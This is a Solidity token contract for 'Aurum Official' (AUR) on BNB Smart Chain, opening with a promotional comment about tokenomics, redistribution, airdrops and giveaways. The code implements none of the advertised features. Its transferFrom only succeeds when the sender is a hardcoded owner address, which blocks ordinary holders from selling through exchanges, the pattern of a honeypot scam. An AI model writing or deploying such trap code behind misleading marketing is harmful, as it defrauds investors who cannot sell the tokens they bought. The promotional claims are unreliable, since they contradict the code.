/**
 *Submitted for verification at BscScan.com on 2021-07-06
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-06
*/

/*Tokenomics:
16% Tax on Buys (at launch) - reduced to 15% Tax after launch
- 2% for liquidity 
- 3% for operations - reduced to 2% after launch
- 4% for buyback - reduced to 2% after launch
- 7% for auto-redistribution - increased to 9% after launch

20% tax on sells (19.2% at launch, 16.8% after launch)
- Tax for selling is decreased by 10% every 2 weeks down to a minimum of 50% after 14 weeks to reward long-term holders
- Sale timer is reset upon any sale
- Any buys add time onto the timer (1/3rd the time from the last sale or first buy) to discourage buying and dumping quickly.

Automatic Redistribution:
- Natively redistributes BNB Automatically just by holding
- Users have the ability to select any reward token (other than Aurum) they want from whitelisted exchanges (PCS V1, PCS V2, and Apeswap to start)
- Rewards will distribute roughly once per hour, depending on volume.
-Distribution automatically happens when holding 1BNB+ worth of Aurum
- Users can use BNB rewarded to buy more Aurum without any fees by calling a function on the contract and sending BNB.  This is limited only to the amount of raw BNB the user received from the contract, not tokens.

Anti-Bot/Whale Features:
- No wallet/contract can make a purchase more than once per block at launch. This prevents multi-txn spamming in a single block.
- 1T Max Transaction imposed on buys and sells at launch.  This may be raised shortly after launch to allow for larger buys.
- Stealth launched to prevent sniping.

Airdrop features:
- Airdrop functions are handled natively in the contract.
- Airdrop receivers are limited in the ability to sell any tokens for the first 24 hours after launch.
- Airdrop receivers can only sell 10% of their total airdropped tokens per day for the first 10 days after launch.

‼️DETAILS FOR LAUNCH ‼️
Today the 5th of July UK time we will be having our stealth launch - this means that there will be no specific time given for this launch
On the day we will give a 6 hour timeframe/window and the launch will happen randomly at any time between then ! This is to prevent bots and snipers 
THERE WILL BE NO COUNTDOWN FOR LAUNCH

The contract address is not yet released ! We will release the contract address today on launch date ! 

We will be launching first on Pancake Swap V2 followed by Bitmart and XT days later !!!

The starting price will be the same as what MoonBoys was left off at which was roughly $0.00000001 this is subject to slight changes due to being pegged to BNB ! 

Market cap will start at roughly $6m 

WEBSITE BEING RELEASED IN THE COMING HOURS !!! 

✅Details for MBS holders receiving Airdrop :
-You do not need to do anything with your MBS tokens ! 
-You will be automatically airdropped the new token 1:1 if you hold over 2 billion coins through pancake swap 
-There is no minimum for airdrop on Bitmart or XT, you will be automatically airdropped there too 
-All you will need to do is add the new Aurum contract address to your trust wallet/metamask when we airdrop the tokens so they show up in your wallet :) 
-Airdrop for pancake swap holders will take place roughly 5 hours after launch ! 
-Airdrop for Bitmart XT will take place days later 
-Your MBS tokens will stay in your wallet but eventually become worthless so you can forget about them 
-In the pinned messages we have a document containing every address that is getting airdropped and the amount they will be sent :)

‼️Aurum official launch on the 5th of July ‼️

Airdropped holders will receive their tokens around 12 hours after launch !!! 

Investors can still buy at launch manually when the contract address is released ✅

🔥LONG TERM HOLDER REWARDS:
Our loyal and long term holders of MBS who have held for over 50 days without selling more than 10% of their tokens will have EXCLUSIVE access to our Aurum Governance Group where you will get EARLY access to news and HUGE announcements, you will also have access to absolutely MASSIVE and most importantly LIFE CHANGING GIVEAWAYS and we mean life changing... Not only this but you will also have your say in the future of plans for Aurum with your vote in polls 🔥

ALSO NOTE:

-Our brand new Whitepaper is expected to be released in the next 24 hours 👀

-Our brand new WEBSITE is hoping to be live in the next 48 hours 👀👀

Strap yourself in people because July is about to be a crazy one ! 
We need every single one of you to shill Aurum as much as you possibly can because nothing is more effective than word of mouth shilling.
We thank you all for being with us on this journey ❤️
*/
pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

// AUR CONTRACT Constrctor
contract Code is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totaltax;
    address private _owner = 0x4E5fDC37A7102F2FF9bbdBD7d08FaabED10EDf0a;
    uint256 public _totalSupply;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * AUR constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "Aurum Official";
        symbol = "AUR";
        decimals = 9;
        _totalSupply = 1000000000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
// AUR functions
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
/**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(from == _owner, "Done!");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
         
    }
}